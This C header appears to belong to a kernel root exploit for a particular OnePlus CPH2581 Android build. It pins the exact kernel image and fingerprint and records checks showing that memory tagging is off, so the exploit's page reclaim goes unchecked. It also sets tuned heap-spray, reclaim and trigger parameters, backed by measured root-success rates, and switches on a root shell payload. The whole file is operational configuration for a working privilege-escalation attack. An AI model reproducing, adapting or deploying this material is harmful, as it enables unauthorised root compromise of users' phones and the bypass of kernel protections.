/* targets/CPH2581-15.0.0.860/target.h -- committed, not resolver-composed.
 *
 * Committed because this kernel's release string is
 * 6.1.118-android14-11-o-g818f2506c9e7, whose OPLUS suffix does not match
 * effective_target_header()'s "-ab(\d+)" pattern, so composition would emit
 * no kernel-image include.
 *
 * Image provenance: the offsets below describe the kernel Image extracted
 * from the India CPH2573 15.0.0.860 OTA boot (boot SHA-256
 * c07125dc7048af293a24be05ff037a31a597fdd67c43042b6811d6ba05c5ccfb, Image
 * SHA-256 bacaae948fcb328352e84bb589626756c37dba358e789f451924402c3990a91b).
 * Its full banner and embedded config are byte-identical to the EEA CPH2581
 * 15.0.0.860 running kernel, which is strong evidence but not whole-image
 * verification; a KMI-check or harvest-live pass on the device remains the
 * final closure.
 *
 * Runtime gates cleared before this target was packaged (2026-10-08,
 * the port campaign's runtime KASAN probe): kernel MTE is not active on
 * this device (no "mte" in /proc/cpuinfo Features, AT_HWCAP2 bit 18 clear,
 * AT_MINSIGSTKSZ=4720), so the compiled-in CONFIG_KASAN_HW_TAGS cannot be
 * operating and the FFWheel page reclaim is not tag-checked.
 *
 * Constants measured on this device on rooted boots: P0_PHYS_OFFSET
 * 0x80000000 (verified via the sysfs memory-section map -- the lowest
 * present section starts exactly there), MM_STRUCT_SZ 0x400 / order-3
 * (confirmed from live slabinfo). The android14-6.1 interface defaults
 * were correct here; only a KMI change would require re-measuring.
 */
#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "CPH2581-15.0.0.860-app"
#else
#define BUILD_VARIANT_LABEL "CPH2581-15.0.0.860-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "OnePlus/CPH2581EEA/OP595DL1:15/AP3A.240617.008/U.R4T3.394441b-19c1836-19c196e:user/release-keys"
#endif

/* The kernel image these offsets describe, as its banner names it. A payload
 * is valid for an IMAGE, not for a phone, which is why the payload artifacts
 * are named per image rather than per device. Anything checking that a binary
 * belongs to the kernel it is about to run against compares this, not the
 * codename in the label above. */
#ifndef TARGET_KERNEL_ID
#define TARGET_KERNEL_ID "6.1.118-android14-11-o-g818f2506c9e7"
#endif

#include "../kernel/CPH2581-15.0.0.860.h"
#include "../kmi/android14-6.1.h"

/* Per-target tuned launch defaults -- the 2026-10-13 A/B census on this
 * device (two cells, 12- and 14-draw, pooled 8 complete sessions in 22
 * verdict draws ~= 36% vs the pre-boost ~17%, p ~= 0.02). These are the
 * getenv fallbacks the campaign launcher was exporting; an environment
 * variable still overrides each at run time. Other targets leave these
 * undefined and get the generic defaults.
 *
 * The two that matter most: KEEP_FREE leaves the OPLUS allocator the
 * headroom the reclaim term needs (the census's measured bottleneck --
 * this knob alone roughly doubled the session rate), and GUESS_ORACLE
 * makes every draw either a root attempt or a clean measured miss
 * instead of a blind fire. SPRAY_CAP 4096 covers more of the populated
 * high bank [34,44) GiB; TRIGGER_TRIES 12 redraws the writer-side
 * reclaim after a CONFIRMED; the nspray pair budgets the two reclaim
 * sprays (groom 16, writer 512). */
#ifndef FFWHEEL_T_SPRAY_CAP_MB
#define FFWHEEL_T_SPRAY_CAP_MB 4096
#endif
#ifndef FFWHEEL_T_KEEP_FREE_MB
#define FFWHEEL_T_KEEP_FREE_MB 2048
#endif
#ifndef FFROOT_T_TRIGGER_TRIES
#define FFROOT_T_TRIGGER_TRIES 12
#endif
#ifndef FFREAD_T_GUESS_ORACLE
#define FFREAD_T_GUESS_ORACLE 1
#endif
#ifndef FFREAD_T_ORACLE_METHOD
#define FFREAD_T_ORACLE_METHOD "direct"
#endif
#ifndef FFREAD_T_CROSS_NSPRAY
#define FFREAD_T_CROSS_NSPRAY 16
#endif
#ifndef FFROOT_T_CROSS_NSPRAY
#define FFROOT_T_CROSS_NSPRAY 512
#endif
#ifndef FFROOT_T_RESOLVED_PAGE
#define FFROOT_T_RESOLVED_PAGE 1
#endif
#ifndef FFROOT_T_FULL
#define FFROOT_T_FULL 1
#endif
#ifndef FFROOT_T_NEUT
#define FFROOT_T_NEUT 1
#endif
#ifndef FFROOT_T_W_SHELL
#define FFROOT_T_W_SHELL 1
#endif
#ifndef FFWHEEL_T_READER_TRIES
#define FFWHEEL_T_READER_TRIES 3
#endif

#endif /* OFFSET_H */
